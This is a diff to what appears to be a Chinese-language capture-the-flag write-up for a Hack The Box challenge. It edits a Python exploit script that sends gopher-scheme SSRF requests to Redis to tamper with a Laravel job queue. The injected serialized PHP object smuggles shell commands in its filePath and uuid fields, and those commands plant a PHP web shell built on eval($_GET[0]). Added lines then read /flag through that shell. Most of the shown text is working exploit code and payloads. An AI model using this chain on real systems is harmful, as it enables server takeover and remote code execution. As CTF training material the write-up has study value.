@@ -55,7 +55,7 @@ import urllib.parse
 import requests
 import json
 import logging
-s=r'{"uuid":"1c0d0b12-641d-49ae-a8f6-5f342fa91e22","displayName":"App\\Jobs\\rmFile","job":"Illuminate\\Queue\\CallQueuedHandler@call","maxTries":null,"maxExceptions":null,"failOnTimeout":false,"backoff":null,"timeout":null,"retryUntil":null,"data":{"commandName":"App\\Jobs\\rmFile","command":"O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:35:\"$(touch /www/public/shell.php).txt;\";s:4:\"uuid\";s:66:\"404;echo \"<?php eval(\\$_GET[0])>\" > /www/public/shell.php;touch aa\";s:3:\"ext\";s:3:\"txt\";}}"},"id":"kFmxDNJFXkM5ZFNBXWZdUfVUknKQoksy","attempts":0}'#要改uuid成别的的话自己修正一下uuid的长度，把s:66改成别的
+s=r'{"uuid":"1c0d0b12-641d-49ae-a8f6-5f342fa91e22","displayName":"App\\Jobs\\rmFile","job":"Illuminate\\Queue\\CallQueuedHandler@call","maxTries":null,"maxExceptions":null,"failOnTimeout":false,"backoff":null,"timeout":null,"retryUntil":null,"data":{"commandName":"App\\Jobs\\rmFile","command":"O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:35:\"$(touch /www/public/shell.php).txt;\";s:4:\"uuid\";s:66:\"404;echo \"<?php eval(\\$_GET[0]);\" > /www/public/shell.php;touch aa\";s:3:\"ext\";s:3:\"txt\";}}"},"id":"kFmxDNJFXkM5ZFNBXWZdUfVUknKQoksy","attempts":0}'#要改uuid成别的的话自己修正一下uuid的长度，把s:67改成别的，改filepath没用
 objlen=len(s)
 htmlencode=urllib.parse.quote(s)
 print(htmlencode)
@@ -67,8 +67,13 @@ flush=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*1\n$8\nflushall\n".replace(r"\n",
 test=r"gopher://127-0-0-1.nip.io:6379/_"+((r"*4\n$4\nlset\n$31\nlaravel_database_queues:default\n$1\n0\n$554\n%7b%22uuid%22%3a%22812d6caf-9d25-42cd-893c-7696a493524d%22%2c%22displayName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22job%22%3a%22Illuminate%5c%5cQueue%5c%5cCallQueuedHandler%40call%22%2c%22maxTries%22%3anull%2c%22maxExceptions%22%3anull%2c%22failOnTimeout%22%3afalse%2c%22backoff%22%3anull%2c%22timeout%22%3anull%2c%22retryUntil%22%3anull%2c%22data%22%3a%7b%22commandName%22%3a%22App%5c%5cJobs%5c%5crmFile%22%2c%22command%22%3a%22O%3a15%3a%5c%22App%5c%5cJobs%5c%5crmFile%5c%22%3a1%3a%7bs%3a9%3a%5c%22fileQueue%5c%22%3bO%3a21%3a%5c%22App%5c%5cMessage%5c%5cFileQueue%5c%22%3a3%3a%7bs%3a8%3a%5c%22filePath%5c%22%3bs%3a45%3a%5c%22%5c%2fsrc%5c%2f1356bb54-1c72-40fe-93ed-78fd5907af51.txt%5c%22%3bs%3a4%3a%5c%22uuid%5c%22%3bs%3a1%3a%5c%221%5c%22%3bs%3a3%3a%5c%22ext%5c%22%3bs%3a3%3a%5c%22txt%5c%22%3b%7d%7d%22%7d%2c%22id%22%3a%22SZ9ZKmfSw3zicR6kc9nvKTwL495P2iUN%22%2c%22attempts%22%3a0%7d\n".replace(r"\n",r"%0d%0a").replace("+","%20")+r"*1%0d%0a%244%0d%0aquit%0d%0a"))
 url="http://192.168.205.128:1337/api/get-html"#改一下ip和端口
 html="https://www.google.com/"
-a=requests.post(url,data={"site":ssrf})
+a=requests.post(url,data={"site":ssrf})  #ssrf是写马，show是查看上传的payload，flush是删除所有队列任务
 print(a.text)
 b=requests.get("http://192.168.205.128:1337"+a.json()["filename"]) #改一下ip和端口
 print(b.text)
 ```
+如果自己去写脚本注意redis的tcp流格式和php反序列化的格式（注意转义）
+改了序列后要等一段时间，等进程执行这个任务就可以了
+
+然后访问http://ip:port/shell.php?0=system(%27cat%20/flag%27);
+得到flag HTB{my_j0b_qu3u3_h4s_h0l3s}
